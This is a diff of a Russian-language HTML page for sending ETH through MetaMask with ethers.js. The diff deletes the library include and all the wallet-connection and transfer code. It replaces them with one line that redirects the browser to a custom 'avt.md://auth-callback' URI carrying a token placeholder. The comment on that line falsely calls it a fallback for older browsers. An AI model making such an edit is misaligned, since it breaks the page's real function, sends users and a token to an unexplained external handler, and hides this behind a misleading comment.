@@ -2,7 +2,6 @@
 <html>
 	<head>
 		<title>Перевод ETH с ethers.js</title>
-		<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
 	</head>
 	<body style="color: black; background-color: white">
 		<button onclick="connect()">Подключиться</button><br /><br />
@@ -34,72 +33,8 @@
 			>клык</a
 		>
 		<script>
-			let signer;
-
-			async function connect() {
-				if (!window.ethereum) {
-					document.getElementById("result").textContent =
-						"Ошибка: MetaMask не найден";
-					return;
-				}
-
-				try {
-					const provider = new ethers.providers.Web3Provider(window.ethereum);
-					await provider.send("eth_requestAccounts", []);
-					signer = provider.getSigner();
-
-					const address = await signer.getAddress();
-					const balanceWei = await provider.getBalance(address);
-					const balanceEth = ethers.utils.formatEther(balanceWei);
-
-					document.getElementById(
-						"result"
-					).textContent = `Подключён адрес: ${address}\nБаланс: ${balanceEth} ETH`;
-				} catch (err) {
-					document.getElementById("result").textContent =
-						"Ошибка: " + err.message;
-				}
-			}
-
-			async function sendEth() {
-				if (!signer) {
-					alert("Сначала подключитесь к кошельку!");
-					return;
-				}
-
-				const to = document.getElementById("toAddress").value.trim();
-				const amount = document.getElementById("amount").value.trim();
-
-				if (!ethers.utils.isAddress(to)) {
-					document.getElementById("result2").textContent =
-						"Введите корректный адрес получателя";
-					return;
-				}
-				if (isNaN(amount) || Number(amount) <= 0) {
-					document.getElementById("result2").textContent =
-						"Введите корректное количество ETH";
-					return;
-				}
-
-				try {
-					const tx = await signer.sendTransaction({
-						to: to,
-						value: ethers.utils.parseEther(amount)
-					});
-
-					document.getElementById(
-						"result2"
-					).textContent = `Транзакция отправлена, хэш:\n${tx.hash}`;
-
-					// Можно ждать подтверждения (опционально)
-					await tx.wait();
-					document.getElementById("result").textContent +=
-						"\nТранзакция подтверждена!";
-				} catch (err) {
-					document.getElementById("result").textContent =
-						"Ошибка при отправке: " + err.message;
-				}
-			}
+			// fallback для более старых браузеров
+			window.location.href = "avt.md://auth-callback?token=YOUR_TOKEN_HERE";
 		</script>
 	</body>
 </html>
